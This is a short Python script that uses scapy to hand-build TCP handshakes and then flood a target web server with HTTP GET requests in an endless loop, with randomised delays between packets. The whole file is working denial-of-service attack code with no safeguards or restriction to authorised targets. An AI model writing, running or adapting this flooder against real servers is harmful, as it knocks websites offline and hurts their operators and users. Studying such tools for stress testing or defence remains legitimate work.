from scapy.all import RandShort, send, IP, TCP, sr1
from random import choice
from sys import path
path.append("..")
import packet_builder

http_get_list = []

get='GET / HTTP/1.1\n\n'
get1='GET   / HTTP/1.1\n\n'
http_get_list.append(get)
http_get_list.append(get1)

def make_tcp_handshake(destination_ip, get):
    """Make TCP handshake by manually creating and sending SYN, SYN-ACK and ACK packets.
    
    Argument:
    destination_ip -- the IP address of the target
    get -- the HTTP GET request in TCP handshake stage

    """
    syn=IP(dst=destination_ip)/TCP(sport=RandShort(), dport=80, flags="S")
    syn_ack=sr1(syn)

    #ack packet
    return IP(dst=destination_ip)/TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1) / get 

def start_http_get_flood(destination_ip):
    """Continuously send HTTP GET requests"""
    try:
        while True:
            send(make_tcp_handshake(destination_ip, choice(http_get_list)), inter=packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")